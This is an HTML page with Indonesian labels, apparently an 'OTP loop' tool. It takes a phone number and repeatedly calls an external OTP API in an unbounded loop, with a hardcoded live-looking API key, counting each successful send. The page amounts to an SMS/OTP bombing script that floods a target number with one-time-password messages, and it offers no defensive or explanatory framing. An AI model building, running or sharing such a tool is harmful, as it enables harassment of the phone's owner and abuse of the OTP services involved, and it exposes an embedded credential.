<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Fetch Loop</title>

<style>
body{
    font-family: Arial, sans-serif;
    background:#111;
    color:#fff;
    padding:20px;
}
input,button{
    padding:10px;
    margin:5px;
}
#log{
    background:#222;
    padding:10px;
    height:300px;
    overflow:auto;
    white-space:pre-wrap;
}
</style>
</head>
<body>

<h2>Fetch OTP Loop</h2>

<input type="text" id="nomor" placeholder="Masukkan Nomor">

<button onclick="start()">Start</button>
<button onclick="stop()">Stop</button>

<h3>Success: <span id="count">0</span></h3>

<div id="log"></div>

<script>
let running = false;
let successCount = 0;

function log(text){
    const el = document.getElementById("log");
    el.innerHTML += text + "\n";
    el.scrollTop = el.scrollHeight;
}

async function loopFetch(){

    const nomor = document.getElementById("nomor").value.trim();

    while(running){

        try{

            const res = await fetch(
                `https://paxapi.vercel.app/api/v1/otp?nomor=${encodeURIComponent(nomor)}&apiKey=pxbr_live_qw7qnvqfb7e5m7ikyrywkycx`
            );

            if(res.status === 200){

                successCount++;
                document.getElementById("count").textContent = successCount;

                log(`✅ Success #${successCount}`);

                // lanjut request berikutnya
                continue;

            }else{

                log(`❌ HTTP ${res.status}`);

                break;
            }

        }catch(err){

            log("Error: " + err.message);
            break;

        }

    }

    running = false;
}

function start(){

    if(running) return;

    successCount = 0;
    document.getElementById("count").textContent = "0";
    document.getElementById("log").innerHTML = "";

    running = true;

    loopFetch();

}

function stop(){

    running = false;
    log("=== STOPPED ===");

}
</script>

</body>
</html>
